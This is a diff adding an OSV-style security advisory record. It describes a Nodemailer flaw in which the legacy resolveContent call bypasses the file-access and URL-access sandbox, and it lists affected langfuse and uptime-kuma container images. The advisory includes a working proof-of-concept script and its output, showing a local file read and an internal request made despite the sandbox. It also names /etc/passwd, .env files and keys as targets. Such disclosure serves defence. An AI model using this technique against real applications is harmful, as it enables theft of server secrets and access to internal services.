@@ -1,0 +1,183 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-aen5-242h-x4xx-r4ek",
+  "modified": "2026-11-14T01:06:37Z",
+  "published": "2026-11-14T01:06:37Z",
+  "upstream": [
+    "GHSA-8m3c-c648-2xjj"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nNodemailer's `disableFileAccess` / `disableUrlAccess` options are a security sandbox that lets an application forbid untrusted message content (`html`/`text`/attachment `path`/`href`) from reading local files or making outbound HTTP(S) requests. The fix for GHSA-wqvq-jvpq-h66f (commit `5f69497`) threaded these flags through the library's internal resolution paths (`MailMessage.resolveAll()` and `_convertDataImages()`), but the public plugin API `MailMessage.resolveContent(...args)` (`lib/mailer/mail-message.js:41-43`) remains a raw passthrough to `shared.resolveContent()`.\n\nWhen called with the documented legacy signature `mail.resolveContent(data, key, callback)`, `shared.resolveContent` normalizes the missing options argument to an empty object (`options = options || {}`, `lib/shared/index.js:530`). The message-level flags that the `MailMessage` constructor already copied into `mail.data` (`lib/mailer/mail-message.js:34-38`) are silently discarded, so `resolveContentValue` skips both access-control guards and reaches `nmfetch(url)` (SSRF, `lib/shared/index.js:588`) or `fs.createReadStream(path)` (arbitrary file read, `lib/shared/index.js:597`).\n\nA plugin or application code that resolves message content through the documented API (the same API the library's own `_convertDataImages` uses, threading the flags explicitly) thereby bypasses the sandbox an application deliberately enabled.\n\n### Details\n\nRoot cause. The `MailMessage` constructor stores the transporter-level sandbox flags on the message object (`lib/mailer/mail-message.js:34-38`):\n\n```js\n['disableFileAccess', 'disableUrlAccess', 'normalizeHeaderKey', 'maxRecipients'].forEach(key => {\n    if (key in options) {\n        this.data[key] = options[key];\n    }\n});\n```\n\nThe public resolver is a pure passthrough (`lib/mailer/mail-message.js:41-43`):\n\n```js\nresolveContent(...args) {\n    return shared.resolveContent(...args);\n}\n```\n\n`shared.resolveContent` supports the legacy 3-argument signature and collapses the missing options to `{}` (`lib/shared/index.js:524-530`):\n\n```js\nmodule.exports.resolveContent = (data, key, options, callback) => {\n    // options is optional; support the legacy resolveContent(data, key, callback) signature\n    if (!callback && typeof options === 'function') {\n        callback = options;\n        options = false;\n    }\n    options = options || {};\n    ...\n    resolveContentValue(data, key, options, callback);\n```\n\n`resolveContentValue` then checks `options.disableUrlAccess` / `options.disableFileAccess` (`lib/shared/index.js:581` / `:590`), both `undefined` for the legacy signature, so it falls through to `nmfetch` (`:588`) or `fs.createReadStream` (`:597`).\n\nContrast with the fixed paths. `resolveAll()` (`lib/mailer/mail-message.js:112-115`) and `_convertDataImages()` (`lib/mailer/index.js:437-440`) both pass the message flags explicitly. The MIME streaming path (`lib/mime-node/index.js:1059-1077`) also honors the flags. So an application that enables the sandbox and then calls `transporter.sendMail()` is protected; the bypass appears only when message content is resolved through the public legacy-signature API — which is the documented plugin usage (the `resolveContent` JSDoc at `lib/shared/index.js:510-523` states it is \"useful when you want to create a plugin that needs a content value\").\n\nAffected versions. Confirmed on `9.1.0` (HEAD `efd6e29c10c6e0c25c57bd2f2a71302838235a4f`, the current npm latest). The gap was introduced by the GHSA-wqvq-jvpq-h66f fix and is still present; the public API has no regression coverage (`test/mailer/mail-message-test.js` contains no `resolveContent` test).\n\n### PoC\n\nRequires: `nodemailer@9.1.0`, a readable local file, and any reachable HTTP endpoint (loopback suffices). Non-destructive; no network egress beyond a local listener.\n\n```js\n'use strict';\nconst nodemailer = require('nodemailer');\nconst MailMessage = require('nodemailer/lib/mailer/mail-message');\n\nconst TARGET_FILE = '/app/src/package.json';   // any readable local file\nconst SSRF_URL = 'http://http-sink:8080/poc-ssrf'; // any local/internal HTTP target\n\nconst transporter = nodemailer.createTransport({\n    streamTransport: true,\n    disableFileAccess: true,   // sandbox explicitly enabled\n    disableUrlAccess: true\n});\n\nconst data = {\n    from: 'a@example.com', to: 'b@example.com', subject: 'poc', text: 'hello',\n    html: { path: TARGET_FILE },\n    attachments: [{ filename: 'x.bin', href: SSRF_URL }]\n};\nconst mail = new MailMessage(transporter, data);\n// mail.data.disableFileAccess === true, mail.data.disableUrlAccess === true\n\n// Documented legacy plugin signature — options argument omitted:\nmail.resolveContent(mail.data, 'html', (err, value) => {\n    if (err) return console.log('BLOCKED', err.code);\n    console.log('FILE_READ_OK len=', value.length);          // -> 1647 (package.json)\n});\nmail.resolveContent(mail.data.attachments, 0, (err, body) => {\n    if (err) return console.log('BLOCKED', err.code);\n    console.log('URL_FETCH_OK body=', body.toString());      // -> fetched response\n});\n```\n\nObserved output on the audit environment (Node 22, `nodemailer@9.1.0`):\n\n```text\nmail.data.disableFileAccess = true | disableUrlAccess = true\n[CONTROL resolveAll] err = EFILEACCESS : File access rejected for /app/src/package.json\n[CONTROL html.path explicit-options] err = EFILEACCESS\n[BYPASS html.path legacy] READ OK len = 1647 head = \"{\\n    \\\"name\\\": \\\"nodemailer\\\",\\n    \\\"version\\\": \\\"9.1.0\\\",\\n    \\\"des\"\n[BYPASS att[0].href legacy] FETCH OK len = 13 body = \"HTTP-SINK OK\\n\"\n```\n\nThe negative controls (`resolveAll`, and `resolveContent` with explicit `{ disableFileAccess: true }`) return `EFILEACCESS`, proving the sandbox works on the protected paths and only the legacy-signature passthrough is bypassed. The same bypass reproduces inside a real `transporter.sendMail()` flow when a `compile` plugin calls `mail.resolveContent(mail.data, 'html', cb)` / `mail.resolveContent(mail.data.attachments, 0, cb)`.\n\n### Impact\n\nAn application that enables `disableFileAccess` / `disableUrlAccess` to contain untrusted message content and that resolves content through the documented plugin API (`mail.resolveContent(data, key, callback)`) has its sandbox silently bypassed:\n\n- Arbitrary local file disclosure: a message `html`/attachment `path` pointing at a server file (`/etc/passwd`, `.env`, key material) is read and returned to the caller / delivered in the message.\n- Server-side request forgery: a message `href` pointing at an internal or loopback URL is fetched from the application host.\n\nReachability precondition: the sandbox flags must be enabled (default off) and the application or its plugin must invoke the documented legacy-signature API on attacker-influenced data. The default `transporter.sendMail()` path remains protected, so this is a defense-in-depth gap in the library's own access-control enforcement rather than a default-flow bypass. It is the same vulnerability class as the previously accepted GHSA-wqvq-jvpq-h66f (CVE-2026-82660) and GHSA-p6gq-j5cr-w38f (CVE-2026-82659), on a distinct third code path.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-2",
+        "purl": "pkg:deb/dhi/langfuse-2"
+      },
+      "versions": [
+        "2.95.12-0",
+        "2.95.12-1",
+        "2.95.12-10",
+        "2.95.12-11",
+        "2.95.12-12",
+        "2.95.12-2",
+        "2.95.12-3",
+        "2.95.12-4",
+        "2.95.12-5",
+        "2.95.12-6",
+        "2.95.12-7",
+        "2.95.12-8",
+        "2.95.12-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-3",
+        "purl": "pkg:deb/dhi/langfuse-3"
+      },
+      "versions": [
+        "3.225.0-0",
+        "3.225.0-1",
+        "3.225.1-0",
+        "3.225.1-1",
+        "3.225.10-0",
+        "3.225.11-0",
+        "3.225.12-0",
+        "3.225.12-1",
+        "3.225.12-2",
+        "3.225.14-0",
+        "3.225.15-0",
+        "3.225.15-1",
+        "3.225.15-2",
+        "3.225.2-0",
+        "3.225.3-0",
+        "3.225.4-0",
+        "3.225.5-0",
+        "3.225.5-1",
+        "3.225.7-0",
+        "3.225.7-1",
+        "3.225.8-0",
+        "3.225.8-1",
+        "3.225.9-0",
+        "3.227.0-0",
+        "3.227.0-1",
+        "3.227.1-0",
+        "3.227.1-1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-4",
+        "purl": "pkg:deb/dhi/langfuse-4"
+      },
+      "versions": [
+        "4.10.0-0",
+        "4.11.0-0",
+        "4.12.0-0",
+        "4.13.0-0",
+        "4.14.0-0",
+        "4.15.0-0",
+        "4.26.0-0",
+        "4.3.1-0",
+        "4.36.1-0",
+        "4.38.0-0",
+        "4.4.0-0",
+        "4.41.0-0",
+        "4.43.0-0",
+        "4.44.0-0",
+        "4.46.0-0",
+        "4.47.0-0",
+        "4.48.0-0",
+        "4.5.0-0",
+        "4.5.0-1",
+        "4.50.0-0",
+        "4.53.0-0",
+        "4.6.0-0",
+        "4.63.0-0",
+        "4.67.0-0",
+        "4.69.0-0",
+        "4.70.0-0",
+        "4.70.1-0",
+        "4.71.0-0",
+        "4.71.0-1",
+        "4.72.0-1",
+        "4.74.0-0",
+        "4.75.0-0",
+        "4.76.0-0",
+        "4.76.0-1",
+        "4.77.0-0",
+        "4.78.0-0",
+        "4.79.0-0",
+        "4.79.0-1",
+        "4.80.0-0",
+        "4.9.0-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-1",
+        "purl": "pkg:deb/dhi/uptime-kuma-1"
+      },
+      "versions": [
+        "1.23.17-0",
+        "1.23.17-1",
+        "1.23.17-2",
+        "1.23.17-3",
+        "1.23.17-4",
+        "1.23.17-5",
+        "1.23.17-6",
+        "1.23.17-7",
+        "1.23.17-8",
+        "1.23.17-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-aen5-242h-x4xx-r4ek"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-8m3c-c648-2xjj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-8m3c-c648-2xjj"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodemailer/nodemailer/commit/dc48ed395c4d6c79ee5c95eb6eff17bafe391474"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodemailer/nodemailer/commit/ab7ef348b9a97b1fd70e7bfbeb56d4ea4a07946b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.1.1"
+    }
+  ]
+}
